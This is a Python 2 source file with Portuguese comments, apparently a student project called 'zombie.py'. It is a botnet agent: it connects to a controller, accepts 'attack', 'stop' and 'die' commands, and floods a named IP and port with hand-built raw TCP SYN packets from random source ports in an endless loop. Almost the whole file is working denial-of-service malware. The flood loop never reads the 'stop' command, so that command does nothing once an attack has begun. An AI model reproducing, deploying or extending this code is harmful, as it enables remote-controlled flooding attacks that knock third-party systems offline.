#coding: utf-8
from os import fork, getppid, wait
from sys import exit
from time import sleep
import socket, sys
import os
import re
import argparse
from struct import *
from random import randint


# Funcoes auxiliares para calculo do checksum

def carry_around_add(a, b):
    c = a + b
    return (c & 0xffff) + (c >> 16)

def checksum(msg):
    s = 0
    if len(msg) % 2 != 0:
        msg += "\x00"
    for i in range(0, len(msg), 2):
        w = ord(msg[i]) + (ord(msg[i+1]) << 8)
        s = carry_around_add(s, w)
    return ~s & 0xffff


# Criacao de um RAW Socket
def cria_raw_socket():
    try:
        raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        return raw_socket
    except socket.error , msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()

    # Para calculo do checksum tcp+ip, eh montado um cabecalho especial
    # Obs: ver em http://www.tcpipguide.com/free/t_TCPChecksumCalculationandtheTCPPseudoHeader-2.htm
def checksum_tcp(source_ip,dest_ip,tcp_header):

    # Campos do Pseudo-Cabecalho
    source_address = socket.inet_aton( source_ip )
    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)

    psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
    psh = psh + tcp_header;

    return checksum(psh)

def montaPacote(seqnumber,source_ip, dest_ip, source_port, dest_port, window_size, id):
    # Construcao do pacote
    packet = '';

    # IP's de origem e destino
    source_ip = source_ip
    dest_ip = dest_ip

    # ======== Campos do cabecalho IP ========

    # Tamanho do header (a ser calculado)
    ihl = 5

    # Versao do protocolo (IPv4)
    version = 4

    # Tipo de Servico
    tos = 0

    # Tamanho total (Python corrige no momento do envio)
    tot_len = 0

    # Identificador do pacote
    id = id

    # Offset Fragmentacao
    frag_off = 0

    # 'Time-to-live'
    ttl = 255

    # Protocolo utilizado (TCP)
    protocol = socket.IPPROTO_TCP

    # Checksum do header (Valor aleatorio p/ desabilitar validacao)
    check = 10

    # IP's de origem e destino.
    # inet_aton converte a notacao numeros-e-pontos em binario (network byte order)
    saddr = socket.inet_aton ( source_ip )
    daddr = socket.inet_aton ( dest_ip )

    # Calculo do tamanho do header. Ipv4 = 64 + ihl, Ipv6 = 96 + ihl
    ihl_version = (version << 4) + ihl

    # the ! in the pack format string means network order
    ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)

    # ======== Campos do cabecalho TCP ========

    # Porta de origem
    source = source_port

    # Porta de destino
    dest = dest_port

    # Sequence Number
    seq = seqnumber

    # ACK Sequence
    ack_seq = 0

    # Data Offset
    doff = 5

    # Flags de controle
    fin = 0
    syn = 1  # Aqui ativamos a flag do SYN
    rst = 0
    psh = 0
    ack = 0
    urg = 0

    # Juncao das flags em apenas um numero binario
    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)

    # Tamanho da janela (utilizando tamanho máximo permitido)
    # htons = host to network short
    window = socket.htons (window_size)

    # Checksum (a ser calculado)
    check = 0

    # Urgent Pointer (zero)
    urg_ptr = 0

    # Reservado
    offset_res = (doff << 4) + 0

    # the ! in the pack format string means network order
    tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)

    # Cálculo do checksum do cabecalho TCP (no caso, do pseudo-cabecalho + header tcp)
    tcp_checksum = checksum_tcp(source_ip,dest_ip,tcp_header)

    # Repete o enpacotamento do cabecalho com o checksum calculado
    tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)

    # Pacote final sao os dois headers, pois pacotes SYN nao possuem campo de dados
    packet = ip_header + tcp_header

    return packet
# ============================================================================================

def receivemessage(socket):
    data = socket.recv(1024)
    if not data :
        #print 'Connection closed'
        sys.exit()
    else :
        #print data
        #sys.stdout.write("Server Response: " + data)
        return data

#comando para ver processos: ps -eo pid,ppid,stat,cmd
#comando mais simples: top
#pid = fork()
pid = 1
if pid == 0:
    exit()
else:
    #print "Parent: I created a child and all i want to do is fude..."
    if(len(sys.argv) < 3) :
        print 'Usage : python zombie.py hostname port'
        sys.exit()

    host = sys.argv[1]
    port = int(sys.argv[2])

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(None)
    # connect to remote host
    try :
        s.connect((host, port))
    except :
        #print 'Unable to connect'
        sys.exit()

    #print 'Connected to remote host'
    alive = 1;

    # Obtenção do ip local
    local_ip =  s.getsockname()[0]
    local_port = s.getsockname()[1]

    # Cria o RAW Socket
    raw_s = cria_raw_socket()
    # Avisa o kernel para nao adicionar headers automaticamente
    raw_s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    # Contadores do programa
    pkt_counter = 0
    try:
        while alive:
            pkt_counter = 0
            data = receivemessage(s)
            #print data
            data2 = data.rstrip()
            if data2 == "die":
                s.send("die")
                alive = 0
            if data2.startswith("attack"):
                dest_ip = data2.split()[1]
                dest_port = data2.split()[2]
                print local_ip + " Attacking ip " + dest_ip + " on " + dest_port
                # Cria pacote
                packet = montaPacote(0,local_ip, dest_ip,  randint(1800,65533),int(dest_port), 5840, 54321)
                # Flood mode
                while(1):
                    raw_s.sendto(packet,(dest_ip,0))
                    pkt_counter += 1
                    #print "sending attack"
                    packet = montaPacote(0,local_ip, dest_ip,  randint(1800,65533),int(dest_port), 5840, 54321)
                    #packet = montaPacote(0,args.source_ip, args.dest_ip, randint(1800,65533), args.dest_port, args.window_size, args.id)
                #print "Attacking " + data2.split()[1] + " at port " + data2.split()[2]
            if data2 == "stop":
                alive = 1
                #print "Stop attacking"

    # Fim do programa
        print "Disconnecting..."
        s.send("die")
        exit()
    except KeyboardInterrupt:
        # Fim do programa
        #print "Disconnecting..."
        s.send("die")
        exit()
